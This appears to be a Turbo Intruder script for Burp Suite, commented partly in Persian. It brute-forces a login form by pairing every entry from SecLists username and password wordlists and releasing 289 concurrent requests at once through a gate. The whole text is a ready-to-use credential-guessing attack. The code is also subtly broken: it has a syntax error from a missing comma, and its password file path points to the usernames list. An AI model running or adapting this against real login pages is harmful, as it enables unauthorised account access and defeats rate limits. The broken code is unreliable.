
USER_FILE = "D:\\Applications\\Wordlists\\SecLists-master\\Usernames\\top-usernames-shortlist.txt"   # <-- set your path (use forward slashes or double backslash)
PASS_FILE = "D:\\Applications\\Wordlists\\SecLists-master\\Usernames\\top-usernames-shortlist.txt"    # <-- set your path
BATCH = 289   # برابر است با تعداد درخواست هایی که میخوای یکچا بفرستی
# مقدار BATCH باید برابر باشد با concurrentConnections

def load_lines(p):
    return [l.rstrip() for l in open(p.replace("\\","/"), "r").readlines() if l.rstrip()]

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            engine=Engine.Burp2
                            autoStart=False,
                            concurrentConnections=BATCH,
                            requestsPerConnection=1,
                            pipeline=False)
    base = target.req
    if "__USER__" not in base or "__PASS__" not in base:
        print("Put __USER__ and __PASS__ in request"); return
    
    template = base.replace("__USER__","%s").replace("__PASS__","%s")

    users = load_lines(USER_FILE);
    pwds = load_lines(PASS_FILE)
    
    engine.start()
    for u in users:
        for p in pwds:    
            engine.queue(template, [u, p], gate="g1")   # queue with gate name

    engine.openGate("g1")
    

def handleResponse(req, interesting):
    table.add(req)